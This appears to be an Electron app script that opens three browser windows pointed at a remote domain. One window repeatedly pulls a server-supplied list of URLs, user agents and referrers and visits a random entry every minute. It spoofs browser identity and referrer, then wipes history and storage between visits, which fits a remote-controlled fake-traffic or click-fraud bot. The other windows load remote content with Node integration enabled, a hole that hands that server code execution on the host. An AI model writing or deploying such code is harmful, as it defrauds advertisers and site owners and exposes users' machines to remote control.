const path = require('path')
const { app, BrowserWindow, webContents } = require('electron')
let win1
let win2
let win3

app.on('ready', function () { win1 = new BrowserWindow({ width: 1280, autoHideMenuBar: true, webPreferences: { nodeIntegration: true, webviewTag: true } })
const options = { extraHeaders: 'pragma: no-cache\n'}
win1.webContents.loadURL('https://tr.neox.in/softgame/?v=' + Date.now() + '', options)
})

app.on('ready', function () { win2 = new BrowserWindow({ width: 1280, autoHideMenuBar: true, webPreferences: { nodeIntegration: true, webviewTag: true } })
const options = { extraHeaders: 'pragma: no-cache\n'}
win2.webContents.loadURL('https://tr.neox.in/softgame/?v=' + Date.now() + '', options)
})

app.on('ready', function () { win3 = new BrowserWindow({ width: 1280, autoHideMenuBar: true, webPreferences: { nodeIntegration: true, enableRemoteModule: true, preload: path.join(__dirname, 'preload.js') } })
function x2 () {
win3.webContents.executeJavaScript('fetch("https://tr.neox.in/neoxgame/rest-api.php?json=softgamellc").then(resp => resp.json())', true).then(data => {
var randomIndex = Math.floor(Math.random()*data.length);
const options = { extraHeaders: 'pragma: no-cache\n' , userAgent: data[randomIndex].useragent, httpReferrer: (data[randomIndex].httpreferrer) }
win3.loadURL((data[randomIndex].url), options)
console.log(data[randomIndex].url)
console.log(data[randomIndex].httpreferrer)  
console.log(data[randomIndex].useragent) 
}) }
win3.loadURL('data:text/html,')

setInterval(() => { x2(); win3.webContents.clearHistory(); win3.webContents.session.clearStorageData(); }, 60000)
x2() })
